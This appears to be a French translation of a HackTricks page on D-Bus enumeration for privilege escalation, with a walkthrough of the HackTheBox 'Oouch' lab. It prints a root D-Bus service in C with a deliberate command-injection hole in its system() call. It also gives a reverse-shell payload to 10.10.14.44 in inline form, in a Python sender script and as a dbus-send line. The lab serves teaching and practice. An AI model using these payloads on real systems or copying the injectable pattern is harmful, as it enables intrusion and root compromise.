## **Énumération D-Bus**

**(Ces informations d'énumération ont été prises à partir de** [**https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/**](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)**)**

Ubuntu desktop utilise D-Bus comme médiateur de communication inter-processus (IPC). Sur Ubuntu, il existe plusieurs bus de messages qui s'exécutent simultanément : un bus système, qui est principalement utilisé par les services privilégiés pour exposer des services pertinents à l'ensemble du système, et un bus de session pour chaque utilisateur connecté, qui expose des services qui ne sont pertinents que pour cet utilisateur spécifique. Comme nous allons essayer d'élever nos privilèges, nous nous concentrerons principalement sur le bus système car les services qui y sont exécutés ont tendance à fonctionner avec des privilèges plus élevés (c'est-à-dire root). Notez que l'architecture D-Bus utilise un "routeur" par bus de session, qui redirige les messages des clients vers les services pertinents avec lesquels ils essaient d'interagir. Les clients doivent spécifier l'adresse du service auquel ils veulent envoyer des messages.

Chaque service est défini par les **objets** et les **interfaces** qu'il expose. Nous pouvons considérer les objets comme des instances de classes dans les langages de programmation orientés objet standard. Chaque instance unique est identifiée par son **chemin d'objet** - une chaîne qui ressemble à un chemin de système de fichiers qui identifie de manière unique chaque objet que le service expose. Une interface standard qui aidera à notre recherche est l'interface **org.freedesktop.DBus.Introspectable**. Elle contient une seule méthode, Introspect, qui renvoie une représentation XML des méthodes, signaux et propriétés prises en charge par l'objet. Ce billet de blog se concentre sur les méthodes et ignore les propriétés et les signaux.

J'ai utilisé deux outils pour communiquer avec l'interface D-Bus : un outil en ligne de commande nommé **gdbus**, qui permet d'appeler facilement les méthodes exposées par D-Bus dans les scripts, et [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), un outil GUI basé sur Python qui aide à énumérer les services disponibles sur chaque bus et à voir quels objets chaque service contient.
```bash
sudo apt-get install d-feet
```
![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

_Figure 1. Fenêtre principale de D-Feet_

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

_Figure 2. Interface de la fenêtre de D-Feet_

Dans le volet de gauche de la Figure 1, vous pouvez voir tous les différents services qui se sont enregistrés auprès du bus système D-Bus (notez le bouton Bus système sélectionné en haut). J'ai sélectionné le service **org.debin.apt**, et D-Feet a automatiquement **interrogé le service pour tous les objets disponibles**. Une fois que j'ai sélectionné un objet spécifique, l'ensemble de toutes les interfaces, avec leurs méthodes, propriétés et signaux respectifs, sont répertoriés, comme on peut le voir dans la Figure 2. Notez que nous obtenons également la signature de chaque méthode **IPC exposée**.

Nous pouvons également voir le **pid du processus** qui héberge chaque service, ainsi que sa **ligne de commande**. Il s'agit d'une fonctionnalité très utile, car nous pouvons valider que le service cible que nous inspectons s'exécute effectivement avec des privilèges plus élevés. Certains services sur le bus système ne s'exécutent pas en tant que root, et sont donc moins intéressants à étudier.

D-Feet permet également d'appeler les différentes méthodes. Dans l'écran d'entrée de méthode, nous pouvons spécifier une liste d'expressions Python, délimitées par des virgules, à interpréter comme les paramètres de la fonction invoquée, comme on peut le voir dans la Figure 3. Les types Python sont encapsulés dans des types D-Bus et transmis au service.

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-23.png)

_Figure 3. Appel de méthodes D-Bus via D-Feet_

Certaines méthodes nécessitent une authentification avant de nous permettre de les invoquer. Nous ignorerons ces méthodes, car notre objectif est d'élever nos privilèges sans identifiants en premier lieu.

![](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-24.png)

_Figure 4. Une méthode qui nécessite une autorisation_

Notez également que certains des services interrogent un autre service D-Bus nommé org.freedeskto.PolicyKit1 pour savoir si un utilisateur doit être autorisé à effectuer certaines actions ou non.

## **Énumération de la ligne de commande**

### Liste des objets de service

Il est possible de lister les interfaces D-Bus ouvertes avec :
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                - 
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service - 
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       - 
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    - 
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… - 
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         - 
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         - 
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    - 
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       - 
org.bluez                                - -               -                (activatable) -                         - 
org.freedesktop.DBus                     1 systemd         root             -             init.scope                - 
org.freedesktop.PackageKit               - -               -                (activatable) -                         - 
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         - 
org.freedesktop.hostname1                - -               -                (activatable) -                         - 
org.freedesktop.locale1                  - -               -                (activatable) -                         - 
```
#### Connexions

Lorsqu'un processus établit une connexion à un bus, le bus attribue à la connexion un nom de bus spécial appelé _nom de connexion unique_. Les noms de bus de ce type sont immuables - il est garanti qu'ils ne changeront pas tant que la connexion existe - et, plus important encore, ils ne peuvent pas être réutilisés pendant la durée de vie du bus. Cela signifie qu'aucune autre connexion à ce bus n'aura jamais un nom de connexion unique attribué, même si le même processus ferme la connexion au bus et en crée une nouvelle. Les noms de connexion uniques sont facilement reconnaissables car ils commencent par le caractère deux-points - qui est autrement interdit.

### Informations sur l'objet de service

Ensuite, vous pouvez obtenir des informations sur l'interface avec:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search 
        cap_fowner cap_fsetid cap_kill cap_setgid 
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service 
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock 
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot 
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot 
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config 
        cap_mknod cap_lease cap_audit_write cap_audit_control 
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog 
        cap_wake_alarm cap_block_suspend cap_audit_read
```
### Liste des interfaces d'un objet de service

Vous devez avoir suffisamment de permissions.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```
### Interface d'introspection d'un objet de service

Notez comment dans cet exemple, l'interface la plus récente découverte en utilisant le paramètre `tree` a été sélectionnée (_voir la section précédente_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Notez la méthode `.Block` de l'interface `htb.oouch.Block` (celle qui nous intéresse). Le "s" des autres colonnes peut signifier qu'elle attend une chaîne de caractères.

### Interface de surveillance/capture

Avec suffisamment de privilèges (juste `send_destination` et `receive_sender` ne suffisent pas), vous pouvez **surveiller une communication D-Bus**.

Pour **surveiller** une **communication**, vous devrez être **root**. Si vous rencontrez encore des problèmes pour être root, consultez [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) et [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Si vous savez comment configurer un fichier de configuration D-Bus pour **autoriser les utilisateurs non root à renifler** la communication, veuillez **me contacter** !
{% endhint %}

Différentes façons de surveiller :
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Dans l'exemple suivant, l'interface `htb.oouch.Block` est surveillée et **le message "**_**lalalalal**_**" est envoyé par erreur** :
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```
Vous pouvez utiliser `capture` à la place de `monitor` pour enregistrer les résultats dans un fichier pcap.

#### Filtrer tout le bruit <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

S'il y a trop d'informations sur le bus, passez une règle de correspondance comme ceci:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Plusieurs règles peuvent être spécifiées. Si un message correspond à _n'importe quelle_ règle, le message sera imprimé. Comme ceci:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Voir la [documentation D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) pour plus d'informations sur la syntaxe des règles de correspondance.

### Plus

`busctl` a encore plus d'options, [**trouvez-les toutes ici**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Scénario vulnérable**

En tant qu'utilisateur **qtc à l'intérieur de l'hôte "oouch" de HTB**, vous pouvez trouver un **fichier de configuration D-Bus inattendu** situé dans _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```markup
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```
Notez que pour envoyer et recevoir des informations via cette communication D-BUS, **vous devrez être l'utilisateur `root` ou `www-data`**.

En tant qu'utilisateur **qtc** à l'intérieur du conteneur Docker **aeb4525789d8**, vous pouvez trouver du code lié à dbus dans le fichier _/code/oouch/routes.py._ Voici le code intéressant :
```python
if primitive_xss.search(form.textfield.data):
            bus = dbus.SystemBus()
            block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
            block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

            client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)  
            response = block_iface.Block(client_ip)
            bus.close()
            return render_template('hacker.html', title='Hacker')
```
Comme vous pouvez le voir, il se **connecte à une interface D-Bus** et envoie à la fonction **"Block"** l'adresse IP du client.

De l'autre côté de la connexion D-Bus, il y a un binaire compilé en C en cours d'exécution. Ce code **écoute** la connexion D-Bus **pour l'adresse IP et appelle iptables via la fonction `system`** pour bloquer l'adresse IP donnée.\
**L'appel à `system` est vulnérable à des fins de commande injection**, donc une charge utile comme celle-ci créera un shell inversé: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploitez-le

À la fin de cette page, vous pouvez trouver le **code C complet de l'application D-Bus**. À l'intérieur, entre les lignes 91 et 97, vous pouvez trouver **comment le `chemin d'objet D-Bus`** et le **`nom d'interface`** sont **enregistrés**. Ces informations seront nécessaires pour envoyer des informations à la connexion D-Bus.
```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```
De plus, à la ligne 57, vous pouvez constater que **la seule méthode enregistrée** pour cette communication D-Bus s'appelle `Block` (_**C'est pourquoi dans la section suivante, les charges utiles seront envoyées à l'objet de service `htb.oouch.Block`, à l'interface `/htb/oouch/Block` et au nom de méthode `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Le code Python suivant enverra la charge utile à la connexion D-Bus vers la méthode `Block` via `block_iface.Block(runme)` (_notez qu'il a été extrait du chunk de code précédent_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl et dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` est un outil utilisé pour envoyer des messages au "Message Bus".
* Message Bus - Un logiciel utilisé par les systèmes pour faciliter les communications entre les applications. Il est lié à la file d'attente de messages (les messages sont ordonnés en séquence), mais dans Message Bus, les messages sont envoyés dans un modèle d'abonnement et sont également très rapides.
* L'étiquette "-system" est utilisée pour indiquer qu'il s'agit d'un message système, pas d'un message de session (par défaut).
* L'étiquette "--print-reply" est utilisée pour imprimer notre message de manière appropriée et recevoir toutes les réponses dans un format lisible par l'homme.
* "--dest=Dbus-Interface-Block" est l'adresse de l'interface Dbus.
* "--string:" - Type de message que nous souhaitons envoyer à l'interface. Il existe plusieurs formats d'envoi de messages tels que double, bytes, booleans, int, objpath. Parmi ceux-ci, le "chemin d'objet" est utile lorsque nous voulons envoyer un chemin d'accès à un fichier à l'interface Dbus. Nous pouvons utiliser un fichier spécial (FIFO) dans ce cas pour transmettre une commande à l'interface au nom d'un fichier. "string: ;" - Cela sert à rappeler le chemin d'objet où nous plaçons le fichier shell FIFO/commande inversée.

Notez que dans `htb.oouch.Block.Block`, la première partie (`htb.oouch.Block`) fait référence à l'objet de service et la dernière partie (`.Block`) fait référence au nom de la méthode.

### Code C

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang 
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message. 
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0) 
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
